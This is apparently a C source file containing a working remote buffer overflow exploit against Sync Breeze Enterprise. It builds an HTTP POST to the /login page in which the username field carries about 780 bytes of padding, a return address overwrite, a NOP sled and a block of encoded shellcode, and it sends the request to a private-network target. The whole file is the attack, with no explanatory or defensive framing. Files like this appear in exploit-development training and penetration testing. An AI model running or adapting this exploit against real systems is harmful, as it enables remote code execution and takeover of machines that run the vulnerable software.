/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.187.10");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {

    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 192.168.187.10\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://172.16.116.222/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 781; // the buffer size was not correct it ended at 779, solution increase to 781 to have exactly 780
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; //0x10090c83 

    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
"\xdb\xd6\xd9\x74\x24\xf4\xba\xa6\xbf\x87\xe3\x5b\x31\xc9"
"\xb1\x53\x83\xc3\x04\x31\x53\x13\x03\xf5\xac\x65\x16\x05"
"\x3a\xeb\xd9\xf5\xbb\x8c\x50\x10\x8a\x8c\x07\x51\xbd\x3c"
"\x43\x37\x32\xb6\x01\xa3\xc1\xba\x8d\xc4\x62\x70\xe8\xeb"
"\x73\x29\xc8\x6a\xf0\x30\x1d\x4c\xc9\xfa\x50\x8d\x0e\xe6"
"\x99\xdf\xc7\x6c\x0f\xcf\x6c\x38\x8c\x64\x3e\xac\x94\x99"
"\xf7\xcf\xb5\x0c\x83\x89\x15\xaf\x40\xa2\x1f\xb7\x85\x8f"
"\xd6\x4c\x7d\x7b\xe9\x84\x4f\x84\x46\xe9\x7f\x77\x96\x2e"
"\x47\x68\xed\x46\xbb\x15\xf6\x9d\xc1\xc1\x73\x05\x61\x81"
"\x24\xe1\x93\x46\xb2\x62\x9f\x23\xb0\x2c\xbc\xb2\x15\x47"
"\xb8\x3f\x98\x87\x48\x7b\xbf\x03\x10\xdf\xde\x12\xfc\x8e"
"\xdf\x44\x5f\x6e\x7a\x0f\x72\x7b\xf7\x52\x1b\x48\x3a\x6c"
"\xdb\xc6\x4d\x1f\xe9\x49\xe6\xb7\x41\x01\x20\x40\xa5\x38"
"\x94\xde\x58\xc3\xe5\xf7\x9e\x97\xb5\x6f\x36\x98\x5d\x6f"
"\xb7\x4d\xcb\x67\x1e\x3e\xee\x8a\xe0\xee\xae\x24\x89\xe4"
"\x20\x1b\xa9\x06\xeb\x34\x42\xfb\x14\x19\xbb\x72\xf2\x37"
"\xab\xd2\xac\xaf\x09\x01\x65\x48\x71\x63\xdd\xfe\x3a\x65"
"\xda\x01\xbb\xa3\x4c\x95\x30\xa0\x48\x84\x46\xed\xf8\xd1"
"\xd1\x7b\x69\x90\x40\x7b\xa0\x42\xe0\xee\x2f\x92\x6f\x13"
"\xf8\xc5\x38\xe5\xf1\x83\xd4\x5c\xa8\xb1\x24\x38\x93\x71"
"\xf3\xf9\x1a\x78\x76\x45\x39\x6a\x4e\x46\x05\xde\x1e\x11"
"\xd3\x88\xd8\xcb\x95\x62\xb3\xa0\x7f\xe2\x42\x8b\xbf\x74"
"\x4b\xc6\x49\x98\xfa\xbf\x0f\xa7\x33\x28\x98\xd0\x29\xc8"
"\x67\x0b\xea\xe8\x85\x99\x07\x81\x13\x48\xaa\xcc\xa3\xa7"
"\xe9\xe8\x27\x4d\x92\x0e\x37\x24\x97\x4b\xff\xd5\xe5\xc4"
"\x6a\xd9\x5a\xe4\xbe";


    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}
